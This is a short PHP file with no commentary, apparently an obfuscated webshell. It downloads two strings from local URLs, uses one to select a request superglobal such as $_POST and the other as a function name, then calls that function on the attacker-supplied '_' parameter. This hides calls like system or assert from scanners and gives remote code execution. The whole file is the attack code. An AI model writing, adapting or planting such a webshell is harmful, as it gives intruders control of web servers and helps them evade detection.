<?php

$url='http://127.0.0.1/text.txt';
$url2='http://127.0.0.1/text2.txt';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
$html = curl_exec($ch);
curl_close($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url2);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
$htmls = curl_exec($ch);
curl_close($ch);
$b='_'.$html;
[""=>$htmls(${$b}[_])];
?>